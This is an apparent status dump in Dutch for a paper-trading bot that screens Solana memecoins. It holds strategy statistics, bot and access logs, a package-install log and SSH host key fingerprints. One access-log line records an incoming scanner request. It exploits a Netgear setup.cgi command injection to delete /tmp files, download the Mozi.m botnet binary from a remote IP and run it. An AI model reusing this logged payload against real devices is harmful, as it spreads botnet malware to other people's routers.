# Schaduwbot status

- tijd: 2026-09-11 02:35:37 UTC
- melding: tick
- host: ubuntu-4gb-fsn1-1 | uptime: up 12 hours, 48 minutes
- bot-service: active
- code-versie: 5d6c187
- schijf: 2.2G/38G | geheugen: 637/3814 MB

## Health
```json
{"ok": true, "last_event_age_s": 0.1, "uptime_s": 46040, "tokens_in_memory": 983, "msgs": 8644489, "trades": 1663227, "creates": 18268, "decode_fail": 115816, "rpc_calls": 27225, "rpc_errors": 2630, "sol_usd": 99.11473315323623, "open_positions": 55}
```

## Laatste rapport
```
# Schaduwbot rapport — 2026-09-11 01:48 UTC

Gelogde schaduwtrades: **14017**

## Funnel per dag

| dag | created | newpairs | final_stretch | screened | screen_pass | entry | exit |
|---|---|---|---|---|---|---|---|
| 2026-09-10 | 14993 | 2145 | 28 | 2144 | 188 | 4138 | 12355 |
| 2026-09-11 | 2526 | 270 | 0 | 271 | 26 | 546 | 1662 |

## Varianten (inzet 0,2 SOL, PumpPortal-fees)

| variant | n | winkans | rug% | gem. winst | gem. verlies | EV/trade | maxDD@20% |
|---|---|---|---|---|---|---|---|
| dip35_V1_gescreend_pass | 174 | 16% | 1.7% | +37.6% | -16.8% | -8.38% | 96% |
| dip35_V1_gescreend_fail | 1400 | 25% | 4.0% | +44.7% | -25.6% | -7.71% | 100% |
| dip35_V1_alle | 1624 | 25% | 4.1% | +43.3% | -25.0% | -8.15% | 100% |
| dip35_V2_gescreend_pass | 175 | 17% | 2.3% | +30.3% | -21.4% | -12.54% | 99% |
| dip35_V2_gescreend_fail | 1407 | 24% | 4.7% | +53.7% | -28.1% | -8.73% | 100% |
| dip35_V2_alle | 1619 | 23% | 4.8% | +51.0% | -27.6% | -9.63% | 100% |
| dip35_V3_gescreend_pass | 175 | 7% | 2.9% | +138.2% | -23.3% | -12.26% | 100% |
| dip35_V3_gescreend_fail | 1415 | 12% | 6.2% | +121.6% | -29.7% | -11.87% | 100% |
| dip35_V3_alle | 1625 | 11% | 6.2% | +118.7% | -29.3% | -12.36% | 100% |
| dip40_V1_gescreend_pass | 162 | 13% | 2.5% | +43.2% | -16.3% | -8.61% | 96% |
| dip40_V1_gescreend_fail | 1361 | 25% | 4.3% | +47.3% | -25.6% | -7.53% | 100% |
| dip40_V1_alle | 1561 | 24% | 4.3% | +46.1% | -24.8% | -7.88% | 100% |
| dip40_V2_gescreend_pass | 163 | 14% | 2.5% | +46.7% | -20.6% | -11.52% | 99% |
| dip40_V2_gescreend_fail | 1365 | 24% | 4.6% | +55.4% | -27.9% | -7.92% | 100% |
| dip40_V2_alle | 1553 | 23% | 4.6% | +54.2% | -27.3% | -8.70% | 100% |
| dip40_V3_gescreend_pass | 163 | 7% | 3.1% | +118.0% | -22.1% | -12.68% | 99% |
| dip40_V3_gescreend_fail | 1373 | 12% | 6.1% | +109.7% | -29.5% | -13.49% | 100% |
| dip40_V3_alle | 1559 | 11% | 6.0% | +107.8% | -28.9% | -13.76% | 100% |
| dip45_V1_gescreend_pass | 151 | 15% | 2.6% | +47.9% | -15.7% | -6.02% | 93% |
| dip45_V1_gescreend_fail | 1317 | 27% | 3.6% | +49.4% | -25.0% | -5.04% | 100% |
| dip45_V1_alle | 1495 | 26% | 3.7% | +48.9% | -24.2% | -5.42% | 100% |
| dip45_V2_gescreend_pass | 151 | 19% | 3.3% | +41.8% | -19.8% | -7.92% | 96% |
| dip45_V2_gescreend_fail | 1318 | 25% | 4.0% | +60.6% | -27.1% | -5.10% | 100% |
| dip45_V2_alle | 1488 | 24% | 4.2% | +58.6% | -26.6% | -5.75% | 100% |
| dip45_V3_gescreend_pass | 151 | 8% | 4.0% | +173.8% | -21.2% | -5.68% | 97% |
| dip45_V3_gescreend_fail | 1325 | 12% | 5.7% | +125.0% | -28.8% | -9.66% | 100% |
| dip45_V3_alle | 1493 | 12% | 5.7% | +126.3% | -28.2% | -9.60% | 100% |

## Beste variant: dip45_V1_gescreend_fail

- n>=500: ✅
- winkans>=0.50: ❌
- rug<=0.05: ✅
- ev>=+0.03: ❌
- maxdd20<=0.40: ❌
- Monte Carlo (20% inzet): kans 10.000× 0.0%, kans ruïne 100.0%
```

## Bot-log (laatste 80 regels)
```
Sep 11 02:20:44 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:20:44,690 rpc WARNING rpc getTokenAccountsByOwner error {'code': -32602, 'message': 'Error getting token program id and mint: Invalid param: could not find mint'}
Sep 11 02:20:44 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:20:44,887 main INFO screen SEYONGPARK pass=0 dev=0.0 ins=13.78 pro=24 1a=False 1b=False 2=True (0.4s)
Sep 11 02:21:29 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:21:29,777 main INFO screen STOCKLESS pass=0 dev=0.0 ins=8.49 pro=38 1a=False 1b=False 2=True (3.6s)
Sep 11 02:21:51 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:21:51,520 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 11 02:21:51 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:21:51,615 rpc WARNING rpc getTokenAccountsByOwner error {'code': -32602, 'message': 'Error getting token program id and mint: Invalid param: could not find mint'}
Sep 11 02:21:53 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:21:53,768 main INFO screen pegged pass=1 dev=0.0 ins=11.35 pro=30 1a=False 1b=False 2=False (10.7s)
Sep 11 02:21:55 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:21:55,565 main INFO screen SOLLY pass=0 dev=0.0 ins=23.99 pro=19 1a=False 1b=False 2=True (4.1s)
Sep 11 02:21:58 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:21:58,455 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 11 02:21:58 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:21:58,576 rpc WARNING rpc getTokenAccountsByOwner error {'code': -32602, 'message': 'Error getting token program id and mint: Invalid param: could not find mint'}
Sep 11 02:22:01 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:22:01,346 main INFO screen ATTENTION pass=0 dev=0.0 ins=17.37 pro=7 1a=False 1b=False 2=True (3.0s)
Sep 11 02:22:17 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:22:17,921 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 11 02:22:18 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:22:18,057 rpc WARNING rpc getTokenAccountsByOwner error {'code': -32602, 'message': 'Error getting token program id and mint: Invalid param: could not find mint'}
Sep 11 02:22:18 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:22:18,297 main INFO screen ATTENTION pass=0 dev=0.0 ins=22.12 pro=17 1a=False 1b=False 2=True (0.4s)
Sep 11 02:22:38 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:22:38,373 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 11 02:22:38 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:22:38,472 rpc WARNING rpc getTokenAccountsByOwner error {'code': -32602, 'message': 'Error getting token program id and mint: Invalid param: could not find mint'}
Sep 11 02:22:42 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:22:42,045 main INFO screen vrl pass=0 dev=0.0 ins=0.0 pro=3 1a=False 1b=False 2=False (3.8s)
Sep 11 02:23:46 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:23:46,649 main INFO screen CLANK pass=0 dev=1.95 ins=24.95 pro=24 1a=False 1b=False 2=True (6.8s)
Sep 11 02:24:17 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:24:17,327 main INFO screen mmrich pass=0 dev=0.76 ins=0.0 pro=4 1a=False 1b=False 2=False (7.3s)
Sep 11 02:24:34 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:24:34,385 main INFO screen HOTRUMP pass=0 dev=0.0 ins=0.0 pro=2 1a=False 1b=False 2=False (7.6s)
Sep 11 02:24:57 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:24:57,074 aiohttp.access INFO 127.0.0.1 [11/Sep/2026:02:24:57 +0000] "GET /health HTTP/1.1" 200 430 "-" "Python-urllib/3.14"
Sep 11 02:24:57 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:24:57,724 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 11 02:24:57 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:24:57,865 rpc WARNING rpc getTokenAccountsByOwner error {'code': -32602, 'message': 'Error getting token program id and mint: Invalid param: could not find mint'}
Sep 11 02:25:01 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:25:01,145 main INFO screen suitdog pass=0 dev=0.0 ins=35.61 pro=12 1a=False 1b=False 2=True (3.5s)
Sep 11 02:25:11 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:25:11,450 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 11 02:25:11 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:25:11,576 rpc WARNING rpc getTokenAccountsByOwner error {'code': -32602, 'message': 'Error getting token program id and mint: Invalid param: could not find mint'}
Sep 11 02:25:11 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:25:11,724 main INFO screen ACAT pass=0 dev=0.0 ins=10.33 pro=19 1a=False 1b=False 2=True (0.3s)
Sep 11 02:25:24 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:25:24,546 main INFO screen HEAVEN pass=1 dev=0.0 ins=13.56 pro=25 1a=False 1b=False 2=False (3.4s)
Sep 11 02:25:31 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:25:31,944 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 11 02:25:32 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:25:32,073 rpc WARNING rpc getTokenAccountsByOwner error {'code': -32602, 'message': 'Error getting token program id and mint: Invalid param: could not find mint'}
Sep 11 02:25:33 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:25:33,592 main INFO screen WOTF pass=0 dev=0.0 ins=79.31 pro=1 1a=False 1b=False 2=True (1.7s)
Sep 11 02:27:11 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:27:11,914 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 11 02:27:12 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:27:12,051 rpc WARNING rpc getTokenAccountsByOwner error {'code': -32602, 'message': 'Error getting token program id and mint: Invalid param: could not find mint'}
Sep 11 02:27:12 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:27:12,924 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 11 02:27:13 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:27:13,008 rpc WARNING rpc getTokenAccountsByOwner error {'code': -32602, 'message': 'Error getting token program id and mint: Invalid param: could not find mint'}
Sep 11 02:27:17 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:27:17,196 main INFO screen SAHUR pass=0 dev=0.0 ins=79.24 pro=7 1a=False 1b=False 2=True (4.3s)
Sep 11 02:27:17 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:27:17,356 main INFO screen USA250 pass=0 dev=0.0 ins=0.0 pro=1 1a=False 1b=False 2=True (5.5s)
Sep 11 02:27:53 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:27:53,630 main INFO screen Slopius pass=0 dev=2.28 ins=28.69 pro=28 1a=False 1b=False 2=True (6.6s)
Sep 11 02:28:27 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:28:27,257 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 11 02:28:27 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:28:27,340 rpc WARNING rpc getTokenAccountsByOwner error {'code': -32602, 'message': 'Error getting token program id and mint: Invalid param: could not find mint'}
Sep 11 02:28:32 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:28:32,861 main INFO screen DIVIDEND pass=0 dev=0.0 ins=21.96 pro=17 1a=False 1b=False 2=True (5.7s)
Sep 11 02:29:03 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:29:03,081 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 11 02:29:03 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:29:03,184 rpc WARNING rpc getTokenAccountsByOwner error {'code': -32602, 'message': 'Error getting token program id and mint: Invalid param: could not find mint'}
Sep 11 02:29:06 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:29:06,677 main INFO screen shecheata pass=0 dev=0.0 ins=0.0 pro=2 1a=False 1b=False 2=False (3.7s)
Sep 11 02:29:15 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:29:15,861 rpc WARNING rpc getTokenAccountsByOwner exc 520, message='Attempt to decode JSON with unexpected mimetype: text/plain; charset=utf-8', url='https://mainnet.helius-rpc.com/?api-key=***'
Sep 11 02:29:17 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:29:17,711 main INFO screen (.)(.) pass=0 dev=0.0 ins=16.05 pro=74 1a=False 1b=False 2=True (13.1s)
Sep 11 02:29:43 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:29:43,291 main INFO screen PIMP pass=0 dev=1.74 ins=0.0 pro=3 1a=False 1b=False 2=False (2.7s)
Sep 11 02:30:13 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:30:13,521 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 11 02:30:13 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:30:13,663 rpc WARNING rpc getTokenAccountsByOwner error {'code': -32602, 'message': 'Error getting token program id and mint: Invalid param: could not find mint'}
Sep 11 02:30:20 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:30:20,582 main INFO screen homo pass=0 dev=0.0 ins=50.77 pro=12 1a=False 1b=False 2=True (7.1s)
Sep 11 02:30:33 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:30:33,178 aiohttp.access INFO 127.0.0.1 [11/Sep/2026:02:30:33 +0000] "GET /health HTTP/1.1" 200 430 "-" "Python-urllib/3.14"
Sep 11 02:30:39 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:30:39,153 main INFO screen 34% pass=0 dev=0.94 ins=0.0 pro=1 1a=False 1b=False 2=False (7.4s)
Sep 11 02:31:00 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:31:00,021 aiohttp.access INFO 16.5.0.236 [11/Sep/2026:02:31:00 +0000] "GET / HTTP/1.1" 404 193 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
Sep 11 02:31:30 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:31:30,350 main INFO screen $PLAY pass=0 dev=0.84 ins=0.0 pro=4 1a=False 1b=False 2=False (3.8s)
Sep 11 02:31:30 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:31:30,889 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 11 02:31:31 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:31:31,386 rpc WARNING rpc getTokenAccountsByOwner error {'code': -32602, 'message': 'Error getting token program id and mint: Invalid param: could not find mint'}
Sep 11 02:31:32 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:31:32,069 main INFO screen Stockless pass=0 dev=0.0 ins=21.52 pro=23 1a=False 1b=False 2=True (1.7s)
Sep 11 02:31:32 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:31:32,135 main INFO screen sheblastd pass=0 dev=0.0 ins=0.0 pro=4 1a=False 1b=False 2=False (4.1s)
Sep 11 02:32:06 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:32:06,370 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 11 02:32:06 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:32:06,474 rpc WARNING rpc getTokenAccountsByOwner error {'code': -32602, 'message': 'Error getting token program id and mint: Invalid param: could not find mint'}
Sep 11 02:32:06 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:32:06,654 main INFO screen SHIBUTT pass=0 dev=0.0 ins=0.0 pro=1 1a=False 1b=False 2=True (0.4s)
Sep 11 02:32:32 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:32:32,707 aiohttp.access INFO 150.107.36.82 [11/Sep/2026:02:32:32 +0000] "GET / HTTP/1.1" 404 193 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0"
Sep 11 02:32:33 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:32:33,052 aiohttp.access INFO 150.107.36.82 [11/Sep/2026:02:32:33 +0000] "UNKNOWN / HTTP/1.0" 400 200 "-" "-"
Sep 11 02:32:49 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:32:49,566 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 11 02:32:49 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:32:49,702 rpc WARNING rpc getTokenAccountsByOwner error {'code': -32602, 'message': 'Error getting token program id and mint: Invalid param: could not find mint'}
Sep 11 02:33:16 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:33:16,202 main INFO screen seed pass=0 dev=0.0 ins=41.24 pro=11 1a=False 1b=False 2=True (26.7s)
Sep 11 02:33:24 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:33:24,700 main INFO screen KIRK pass=0 dev=0.0 ins=0.0 pro=4 1a=False 1b=False 2=False (5.0s)
Sep 11 02:34:02 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:34:02,683 aiohttp.access INFO 202.141.33.132 [11/Sep/2026:02:34:02 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://202.141.33.132:42641/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 174 "-" "-"
Sep 11 02:34:19 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:34:19,162 main INFO screen LareeLobs pass=0 dev=0.44 ins=0.0 pro=4 1a=False 1b=False 2=False (3.1s)
Sep 11 02:34:29 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:34:29,953 main INFO screen Morgan pass=1 dev=0.0 ins=8.11 pro=75 1a=False 1b=False 2=False (2.4s)
Sep 11 02:34:39 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:34:39,370 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 11 02:34:39 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:34:39,507 rpc WARNING rpc getTokenAccountsByOwner error {'code': -32602, 'message': 'Error getting token program id and mint: Invalid param: could not find mint'}
Sep 11 02:34:39 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:34:39,667 main INFO screen DIVIDEND pass=0 dev=0.0 ins=0.0 pro=1 1a=False 1b=False 2=True (0.4s)
Sep 11 02:34:53 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:34:53,659 main INFO screen $GOAT pass=0 dev=10.75 ins=0.0 pro=3 1a=False 1b=False 2=False (2.1s)
Sep 11 02:35:04 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:35:04,222 rpc WARNING rpc getTokenLargestAccounts error {'code': -32602, 'message': 'Invalid param: not a Token mint'}
Sep 11 02:35:04 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:35:04,362 rpc WARNING rpc getTokenAccountsByOwner error {'code': -32602, 'message': 'Error getting token program id and mint: Invalid param: could not find mint'}
Sep 11 02:35:04 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:35:04,487 main INFO screen HYRAX pass=0 dev=0.0 ins=35.77 pro=16 1a=False 1b=False 2=True (0.3s)
Sep 11 02:35:08 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:35:08,079 main INFO screen Midas pass=0 dev=0.38 ins=0.0 pro=2 1a=False 1b=False 2=False (3.7s)
Sep 11 02:35:24 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:35:24,566 main INFO screen CHefQueef pass=0 dev=0.21 ins=0.0 pro=3 1a=False 1b=False 2=False (2.4s)
Sep 11 02:35:36 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:35:36,814 main INFO screen LONGDONG pass=0 dev=0.52 ins=0.0 pro=3 1a=False 1b=False 2=False (3.4s)
Sep 11 02:35:37 ubuntu-4gb-fsn1-1 python[2122]: 2026-09-11 02:35:37,061 aiohttp.access INFO 127.0.0.1 [11/Sep/2026:02:35:37 +0000] "GET /health HTTP/1.1" 200 429 "-" "Python-urllib/3.14"
```

## Bootstrap-log (laatste 60 regels)
```
Unpacking libcurl4t64:amd64 (8.18.0-1ubuntu2.5) over (8.18.0-1ubuntu2.4)…
Preparing to unpack …/08-libcurl3t64-gnutls_8.18.0-1ubuntu2.5_amd64.deb…
Unpacking libcurl3t64-gnutls:amd64 (8.18.0-1ubuntu2.5) over (8.18.0-1ubuntu2.4)…
Selecting previously unselected package python3-wheel.
Preparing to unpack …/09-python3-wheel_0.46.3-2_all.deb…
Unpacking python3-wheel (0.46.3-2)…
Selecting previously unselected package python3-pip.
Preparing to unpack …/10-python3-pip_25.1.1+dfsg-1ubuntu2_all.deb…
Unpacking python3-pip (25.1.1+dfsg-1ubuntu2)…
Selecting previously unselected package python3-pip-whl.
Preparing to unpack …/11-python3-pip-whl_25.1.1+dfsg-1ubuntu2_all.deb…
Unpacking python3-pip-whl (25.1.1+dfsg-1ubuntu2)…
Selecting previously unselected package python3-setuptools-whl.
Preparing to unpack …/12-python3-setuptools-whl_78.1.1-0.1build1_all.deb…
Unpacking python3-setuptools-whl (78.1.1-0.1build1)…
Selecting previously unselected package python3.14-venv.
Preparing to unpack …/13-python3.14-venv_3.14.4-1ubuntu0.2_amd64.deb…
Unpacking python3.14-venv (3.14.4-1ubuntu0.2)…
Selecting previously unselected package python3-venv.
Preparing to unpack …/14-python3-venv_3.14.3-0ubuntu2_amd64.deb…
Unpacking python3-venv (3.14.3-0ubuntu2)…
Setting up python3-setuptools-whl (78.1.1-0.1build1)…
Setting up libcurl4t64:amd64 (8.18.0-1ubuntu2.5)…
Setting up python3-pip-whl (25.1.1+dfsg-1ubuntu2)…
Setting up libpython3.14-minimal:amd64 (3.14.4-1ubuntu0.2)…
Setting up libcurl3t64-gnutls:amd64 (8.18.0-1ubuntu2.5)…
Setting up python3-wheel (0.46.3-2)…
Setting up python3.14-gdbm (3.14.4-1ubuntu0.2)…
Setting up python3-pip (25.1.1+dfsg-1ubuntu2)…
Setting up curl (8.18.0-1ubuntu2.5)…
Setting up python3.14-minimal (3.14.4-1ubuntu0.2)…
Setting up libpython3.14-stdlib:amd64 (3.14.4-1ubuntu0.2)…
Setting up libpython3.14:amd64 (3.14.4-1ubuntu0.2)…
Setting up python3.14 (3.14.4-1ubuntu0.2)…
Setting up python3.14-venv (3.14.4-1ubuntu0.2)…
Setting up python3-venv (3.14.3-0ubuntu2)…
Processing triggers for systemd (259.5-0ubuntu3.4)…
Processing triggers for man-db (2.13.1-1build1)…
Processing triggers for libc-bin (2.43-2ubuntu2.3)…

Running kernel seems to be up-to-date.

Restarting services...
 systemctl restart packagekit.service

Service restarts being deferred:
 systemctl restart cloud-init-main.service
 systemctl restart networkd-dispatcher.service
 systemctl restart unattended-upgrades.service

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
Created symlink '/etc/systemd/system/multi-user.target.wants/schaduwbot.service' → '/etc/systemd/system/schaduwbot.service'.
install klaar
status.md -> 200 
report.json -> 201 
===== bootstrap klaar 2026-09-10T13:48:49Z =====
```

## cloud-init (laatste 25 regels)
```
|.BoBoB.          |
|  o.. +E         |
| .   .. S .      |
|.    . o =       |
| .  . + + .      |
| .+o . . o       |
| .**.            |
+----[SHA256]-----+
Generating public/private ed25519 key pair.
Your identification has been saved in /etc/ssh/ssh_host_ed25519_key
Your public key has been saved in /etc/ssh/ssh_host_ed25519_key.pub
The key fingerprint is:
SHA256:w2XLkdz/wp4oYdhzAWpZtAWfv0pFj8xAggp36PYfUQQ root@ubuntu-4gb-fsn1-1
The key's randomart image is:
+--[ED25519 256]--+
|       . oE++    |
|    . o o.oO..   |
|     + o +Bo= .  |
|      +.++.o.B o |
|     . oSoo. .B .|
|        o.* .o o |
|         o =. + .|
|          o. + o |
|           .o o  |
+----[SHA256]-----+
```
